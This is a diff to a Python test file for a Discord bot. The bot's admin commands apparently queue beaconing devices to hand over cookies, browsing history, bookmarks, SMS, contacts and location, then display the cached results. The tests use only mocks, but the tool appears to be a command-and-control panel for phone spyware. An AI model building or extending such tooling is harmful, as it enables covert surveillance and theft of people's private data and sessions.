@@ -26,9 +26,10 @@ from bot import (  # noqa: E402
     log_access_denied,
     call_server,
     format_server_devices,
-    format_server_cookies,
     format_server_simple,
     format_server_results,
+    format_cached_for_task,
+    format_queue_confirmation,
     beacon_interval_autocomplete,
     protocol_autocomplete,
 )
@@ -43,6 +44,9 @@ request_cookies = bot_module.request_cookies.callback  # type: ignore[union-attr
 set_communication_protocol = bot_module.set_communication_protocol.callback  # type: ignore[union-attr]
 request_history = bot_module.request_history.callback  # type: ignore[union-attr]
 request_bookmarks = bot_module.request_bookmarks.callback  # type: ignore[union-attr]
+request_sms = bot_module.request_sms.callback  # type: ignore[union-attr]
+request_location = bot_module.request_location.callback  # type: ignore[union-attr]
+request_contacts = bot_module.request_contacts.callback  # type: ignore[union-attr]
 show_results = bot_module.show_results.callback  # type: ignore[union-attr]
 
 
@@ -192,29 +196,66 @@ class TestFormatHelpers:
         result = format_server_devices(data)
         assert "No devices" in result
 
-    def test_format_server_cookies(self) -> None:
-        data = {
-            "status": "success",
-            "message": "Retrieved 1 cookie(s)",
-            "data": {
-                "cookies_by_device": {
-                    "dev-a": {"session": "abc123"},
-                }
-            },
-        }
-        result = format_server_cookies(data)
-        assert "🍪" in result
-        assert "session" in result
-        assert "abc123" in result
+    def test_format_cached_for_task_no_data(self) -> None:
+        result = format_cached_for_task(None, "request-cookies")
+        assert "unreachable" in result
 
-    def test_format_server_cookies_empty(self) -> None:
+    def test_format_cached_for_task_empty_results(self) -> None:
+        data = {"status": "success", "data": {"results_by_device": {}}}
+        result = format_cached_for_task(data, "request-cookies")
+        assert "No cached data" in result
+
+    def test_format_cached_for_task_shows_output(self) -> None:
         data = {
-            "status": "success",
-            "message": "No cookies",
-            "data": {"cookies_by_device": {}},
+            "data": {
+                "results_by_device": {
+                    "POCO_F5": {
+                        "request-cookies": [
+                            {"data": {"output": "google.com: s=abc"}, "success": True, "received_at": "2025-01-15T10:00:00Z"}
+                        ]
+                    }
+                }
+            }
         }
-        result = format_server_cookies(data)
-        assert "No cookies" in result
+        result = format_cached_for_task(data, "request-cookies")
+        assert "POCO_F5" in result
+        assert "google.com" in result
+
+    def test_format_cached_for_task_filters_by_device(self) -> None:
+        data = {
+            "data": {
+                "results_by_device": {
+                    "POCO_F5": {
+                        "request-history": [
+                            {"data": {"output": "example.com"}, "success": True, "received_at": "2025-01-15T10:00:00Z"}
+                        ]
+                    },
+                    "OTHER": {
+                        "request-history": [
+                            {"data": {"output": "other.com"}, "success": True, "received_at": "2025-01-15T10:00:00Z"}
+                        ]
+                    },
+                }
+            }
+        }
+        result = format_cached_for_task(data, "request-history", device_filter="POCO_F5")
+        assert "POCO_F5" in result
+        assert "OTHER" not in result
+
+    def test_format_queue_confirmation_success(self) -> None:
+        resp = {"status": "success", "message": "queued"}
+        result = format_queue_confirmation(resp, "request-cookies", "*")
+        assert "queued" in result.lower()
+        assert "all devices" in result
+
+    def test_format_queue_confirmation_server_unreachable(self) -> None:
+        result = format_queue_confirmation(None, "request-history", "*")
+        assert "unreachable" in result.lower()
+
+    def test_format_queue_confirmation_specific_device(self) -> None:
+        resp = {"status": "success", "message": "queued"}
+        result = format_queue_confirmation(resp, "request-sms", "POCO_F5")
+        assert "POCO_F5" in result
 
     def test_format_server_simple_success(self) -> None:
         data = {"status": "success", "message": "Interval set to 16"}
@@ -298,48 +339,38 @@ class TestSetBeaconIntervalCommand:
         assert "Access denied" in sent_text
 
 
+def _make_request_mock(task_type: str, with_cached_data: bool = False):
+    """Return an async side_effect for call_server that simulates /request-* flow."""
+    results_data = {
+        "status": "success",
+        "data": {
+            "results_by_device": {
+                "POCO_F5": {
+                    task_type: [
+                        {
+                            "data": {"output": f"cached output for {task_type}"},
+                            "success": True,
+                            "received_at": "2025-01-15T10:00:00Z",
+                        }
+                    ]
+                }
+            } if with_cached_data else {}
+        },
+    }
+    queue_data = {"status": "success", "message": f"Task '{task_type}' queued for 1 device(s)"}
+
+    async def side_effect(path, **kwargs):
+        if path == "/admin/results":
+            return results_data
+        if path == "/admin/queue-task":
+            return queue_data
+        return None
+
+    return side_effect
+
+
 class TestRequestCookiesCommand:
     """Tests for the /request-cookies slash command."""
-
-    @pytest.mark.asyncio
-    async def test_admin_gets_cached_cookies_and_queue_message(self) -> None:
-        interaction = _make_interaction()
-        cookie_data = {
-            "status": "success",
-            "message": "Retrieved 1 cookie(s)",
-            "data": {
-                "cookies_by_device": {
-                    "POCO_F5": {"session": "abc123"},
-                }
-            },
-        }
-        queue_data = {
-            "status": "success",
-            "message": "Task 'request-cookies' queued for 1 device(s)",
-        }
-
-        async def mock_call_server(path, **kwargs):
-            if path == "/admin/cookies":
-                return cookie_data
-            elif path == "/admin/queue-task":
-                return queue_data
-            return None
-
-        with patch("bot.call_server", side_effect=mock_call_server):
-            await request_cookies(interaction)
-        sent_text = interaction.response.send_message.call_args[0][0]
-        assert "session" in sent_text
-        assert "📡" in sent_text
-        assert "queued" in sent_text.lower()
-
-    @pytest.mark.asyncio
-    async def test_server_unreachable_shows_fallback_and_queue_error(self) -> None:
-        interaction = _make_interaction()
-        with patch("bot.call_server", return_value=None):
-            await request_cookies(interaction)
-        sent_text = interaction.response.send_message.call_args[0][0]
-        assert "Cookies" in sent_text
-        assert "could not be queued" in sent_text
 
     @pytest.mark.asyncio
     async def test_non_admin_gets_denied(self) -> None:
@@ -347,6 +378,40 @@ class TestRequestCookiesCommand:
         await request_cookies(interaction)
         sent_text = interaction.response.send_message.call_args[0][0]
         assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_shows_cached_data_and_queue_confirmation(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies", with_cached_data=True)):
+            await request_cookies(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-cookies" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_no_cached_data_shows_empty_and_queue(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies")):
+            await request_cookies(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "No cached data" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_cookies(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "unreachable" in sent_text.lower()
+
+    @pytest.mark.asyncio
+    async def test_specific_device_included_in_confirmation(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-cookies")):
+            await request_cookies(interaction, device="POCO_F5")
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "POCO_F5" in sent_text
 
 
 class TestSetCommunicationProtocolCommand:
@@ -381,46 +446,6 @@ class TestRequestHistoryCommand:
     """Tests for the /request-history slash command."""
 
     @pytest.mark.asyncio
-    async def test_admin_queues_for_all_devices_by_default(self) -> None:
-        interaction = _make_interaction()
-        server_data = {
-            "status": "success",
-            "message": "Task 'request-history' queued for 3 device(s)",
-        }
-        with patch("bot.call_server", return_value=server_data) as mock_call:
-            await request_history(interaction)
-            mock_call.assert_called_once_with(
-                "/admin/queue-task",
-                method="POST",
-                json_body={
-                    "device_name": "*",
-                    "task_type": "request-history",
-                    "parameters": {},
-                },
-            )
-        sent_text = interaction.response.send_message.call_args[0][0]
-        assert "✅" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_admin_queues_for_specific_device(self) -> None:
-        interaction = _make_interaction()
-        server_data = {
-            "status": "success",
-            "message": "Task 'request-history' queued for POCO_F5",
-        }
-        with patch("bot.call_server", return_value=server_data) as mock_call:
-            await request_history(interaction, device="POCO_F5")
-            mock_call.assert_called_once_with(
-                "/admin/queue-task",
-                method="POST",
-                json_body={
-                    "device_name": "POCO_F5",
-                    "task_type": "request-history",
-                    "parameters": {},
-                },
-            )
-
-    @pytest.mark.asyncio
     async def test_non_admin_gets_denied(self) -> None:
         interaction = _make_interaction(author_id=999)
         await request_history(interaction)
@@ -428,56 +453,33 @@ class TestRequestHistoryCommand:
         assert "Access denied" in sent_text
 
     @pytest.mark.asyncio
+    async def test_shows_cached_and_queues(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-history", with_cached_data=True)):
+            await request_history(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-history" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
     async def test_server_unreachable_shows_error(self) -> None:
         interaction = _make_interaction()
         with patch("bot.call_server", return_value=None):
             await request_history(interaction)
         sent_text = interaction.response.send_message.call_args[0][0]
-        assert "Server unreachable" in sent_text
+        assert "unreachable" in sent_text.lower()
+
+    @pytest.mark.asyncio
+    async def test_specific_device_in_confirmation(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-history")):
+            await request_history(interaction, device="POCO_F5")
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "POCO_F5" in sent_text
 
 
 class TestRequestBookmarksCommand:
     """Tests for the /request-bookmarks slash command."""
-
-    @pytest.mark.asyncio
-    async def test_admin_queues_for_all_devices_by_default(self) -> None:
-        interaction = _make_interaction()
-        server_data = {
-            "status": "success",
-            "message": "Task 'request-bookmarks' queued for 3 device(s)",
-        }
-        with patch("bot.call_server", return_value=server_data) as mock_call:
-            await request_bookmarks(interaction)
-            mock_call.assert_called_once_with(
-                "/admin/queue-task",
-                method="POST",
-                json_body={
-                    "device_name": "*",
-                    "task_type": "request-bookmarks",
-                    "parameters": {},
-                },
-            )
-        sent_text = interaction.response.send_message.call_args[0][0]
-        assert "✅" in sent_text
-
-    @pytest.mark.asyncio
-    async def test_admin_queues_for_specific_device(self) -> None:
-        interaction = _make_interaction()
-        server_data = {
-            "status": "success",
-            "message": "Task 'request-bookmarks' queued for POCO_F5",
-        }
-        with patch("bot.call_server", return_value=server_data) as mock_call:
-            await request_bookmarks(interaction, device="POCO_F5")
-            mock_call.assert_called_once_with(
-                "/admin/queue-task",
-                method="POST",
-                json_body={
-                    "device_name": "POCO_F5",
-                    "task_type": "request-bookmarks",
-                    "parameters": {},
-                },
-            )
 
     @pytest.mark.asyncio
     async def test_non_admin_gets_denied(self) -> None:
@@ -487,12 +489,113 @@ class TestRequestBookmarksCommand:
         assert "Access denied" in sent_text
 
     @pytest.mark.asyncio
+    async def test_shows_cached_and_queues(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-bookmarks", with_cached_data=True)):
+            await request_bookmarks(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-bookmarks" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
     async def test_server_unreachable_shows_error(self) -> None:
         interaction = _make_interaction()
         with patch("bot.call_server", return_value=None):
             await request_bookmarks(interaction)
         sent_text = interaction.response.send_message.call_args[0][0]
-        assert "Server unreachable" in sent_text
+        assert "unreachable" in sent_text.lower()
+
+    @pytest.mark.asyncio
+    async def test_specific_device_in_confirmation(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-bookmarks")):
+            await request_bookmarks(interaction, device="POCO_F5")
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "POCO_F5" in sent_text
+
+
+class TestRequestSmsCommand:
+    """Tests for the /request-sms slash command."""
+
+    @pytest.mark.asyncio
+    async def test_non_admin_gets_denied(self) -> None:
+        interaction = _make_interaction(author_id=999)
+        await request_sms(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_shows_cached_and_queues(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-sms", with_cached_data=True)):
+            await request_sms(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-sms" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_sms(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "unreachable" in sent_text.lower()
+
+
+class TestRequestLocationCommand:
+    """Tests for the /request-location slash command."""
+
+    @pytest.mark.asyncio
+    async def test_non_admin_gets_denied(self) -> None:
+        interaction = _make_interaction(author_id=999)
+        await request_location(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_shows_cached_and_queues(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-location", with_cached_data=True)):
+            await request_location(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-location" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_location(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "unreachable" in sent_text.lower()
+
+
+class TestRequestContactsCommand:
+    """Tests for the /request-contacts slash command."""
+
+    @pytest.mark.asyncio
+    async def test_non_admin_gets_denied(self) -> None:
+        interaction = _make_interaction(author_id=999)
+        await request_contacts(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "Access denied" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_shows_cached_and_queues(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", side_effect=_make_request_mock("request-contacts", with_cached_data=True)):
+            await request_contacts(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "cached output for request-contacts" in sent_text
+        assert "📡" in sent_text
+
+    @pytest.mark.asyncio
+    async def test_server_unreachable_shows_error(self) -> None:
+        interaction = _make_interaction()
+        with patch("bot.call_server", return_value=None):
+            await request_contacts(interaction)
+        sent_text = interaction.response.send_message.call_args[0][0]
+        assert "unreachable" in sent_text.lower()
 
 
 # ---------------------------------------------------------------------------
